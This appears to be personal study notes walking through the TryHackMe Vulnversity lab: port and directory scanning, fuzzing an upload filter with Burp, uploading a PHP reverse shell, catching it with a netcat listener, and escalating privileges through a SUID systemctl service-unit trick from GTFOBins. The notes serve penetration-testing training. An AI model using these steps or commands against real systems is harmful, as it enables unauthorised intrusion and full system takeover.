SUID = set user ID
SGID = set group ID

# SUID Overview
- permission for linux files > (file-owner)(group)(everyone)
- SUID allows users to execute files with permissions of a specified user. 
```bash
find / -perm -u=s -type f 2>/dev/null #hunt for files with s in permissions
#not everything is vulnerable, can use gtfo bins after to search
```

# Gaining a Foothold
Using vulnversity from THM: https://tryhackme.com/room/vulnversity
- nmap scan >> 21, 22, 139, 445, 3128, 3333
	- 3333 > looks juicy with http title
- can use burpsuite
	- (use foxyproxy)
	- target > add to scope > show only in-scope items
- dirsearch
```bash
python3 dirsearch.py -u https://[IP:PORT] -e html -x 400,401,403
# /internal stands out >> check it
#can upload files?
#try php reverse sell penterseter monkey >>> edit and make sure IP and port are correct
```
- use burp > send to intruder > sniper attack
	- payload options > php3, php4, phtml, php6 >>> we are trying to fuzz the extension
	- we can grep out the 'extension not allowed' reply
- upload shell.phtml
- start listener
```bash
nc -nvlp 7777
#access to a shell > can escalate next
```

# Escalation via SUID
```bash
#use find command
find / -perm -u=s -type f 2>/dev/null

#systemctl juicy
```
- get from gtfobins
```bash
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```